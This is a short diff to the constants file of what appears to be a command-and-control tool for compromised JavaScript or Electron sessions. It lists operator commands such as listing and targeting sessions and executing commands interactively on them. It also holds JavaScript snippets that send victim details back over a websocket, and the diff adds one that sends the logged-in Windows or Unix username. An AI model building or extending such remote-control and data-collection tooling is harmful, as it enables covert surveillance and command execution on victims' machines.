@@ -19,7 +19,7 @@ module Constants
         "exit" => "Quit the application.",
         "sessions" => "List active sessions.",
         "target" => "Select targeted session.",
-        "info" => "Get session information (IP, User Agent, Operating System, Language).",
+        "info" => "Get session information (IP, User Agent, Operating System, Language, Path, Logged in user).",
         "exec" => "Execute commands on the targeted session interactively. Provide an argument to execute a file's contents (e.g. a module).",
         "get_cert" => "Get a free TLS certificate from LetsEncrypt.",
         "pry" => "Drop into a local Pry session.",
@@ -35,7 +35,8 @@ module Constants
         "USER_AGENT" => "ws.send(\"User agent: \" + navigator.appVersion);",
         "OPERATING_SYSTEM" => "ws.send(\"OS: \" + navigator.platform);",
         "LANGUAGE" => "ws.send(\"Language: \" + navigator.language);",
-        "PATH" => "ws.send(\"Program path: \" + window.location);"
+        "PATH" => "ws.send(\"Program path: \" + window.location);",
+        "USER" => "ws.send(\"Logged in user: \" + process.env.USERDOMAIN + \"/\" + (process.env.USERNAME || process.env.USER));"
     }.sort
     def Constants.getWelcomeMessage()
         return @welcomeMessage
